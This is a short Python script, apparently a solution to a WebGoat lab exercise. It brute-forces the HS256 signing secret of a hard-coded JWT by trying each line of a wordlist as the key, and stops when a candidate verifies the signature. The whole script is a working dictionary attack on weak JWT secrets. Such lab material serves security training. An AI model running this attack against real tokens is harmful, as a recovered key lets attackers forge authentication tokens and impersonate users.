import jwt

token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3Nzc2ODEwMSwiZXhwIjoxNjc3NzY4MTYxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.cXV4j5CLZdrLmbThz7old0cnjf83W6bO-MdgvZNBDYw'

try :
    f = open('20k.txt','r')
    for key in f:
        try:
            decoded = jwt.decode(
                token,
                key.rstrip('\n'),
                algorithms=["HS256"]
            )
        except Exception as e:
            print(e)
            if 'Signature has expired' in str(e):
                # print(key)
                break
            
except :
    print('Something went wrong')